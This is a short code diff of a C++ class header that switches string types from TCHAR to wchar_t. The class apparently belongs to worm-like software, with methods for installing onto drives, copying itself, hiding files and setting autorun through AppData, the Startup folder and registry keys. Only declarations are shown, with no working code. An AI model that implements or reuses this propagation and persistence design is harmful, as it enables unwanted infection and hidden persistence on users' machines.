@@ -11,20 +11,20 @@ public:
 	bool InstallOnDrives();
 
 private:
-	bool InstallOnDrive(const TCHAR* drive);
+	bool InstallOnDrive(const wchar_t* drive);
 
-	bool CopyTo(const TCHAR* path);
-	bool HideFile(const TCHAR* path);
+	bool CopyTo(const wchar_t* path);
+	bool HideFile(const wchar_t* path);
 	bool SetAutorunAppdata(bool autorun);
 	bool SetAutorunStartup(bool autorun);
 	bool SetAutorunRegistry(bool autorun);
 
-	bool SetAutorunRegistryWithKey(bool autorun, HKEY key, const TCHAR* subkey);
+	bool SetAutorunRegistryWithKey(bool autorun, HKEY key, const wchar_t* subkey);
 
-	TCHAR exeName[MAX_PATH];
-	TCHAR appDataPath[1024];
-	TCHAR registryPath[1024];
-	TCHAR startupPath[1024];
+	wchar_t exeName[MAX_PATH];
+	wchar_t appDataPath[1024];
+	wchar_t registryPath[1024];
+	wchar_t startupPath[1024];
 
 	char autorunData[1024];
 	size_t autorunBytes;
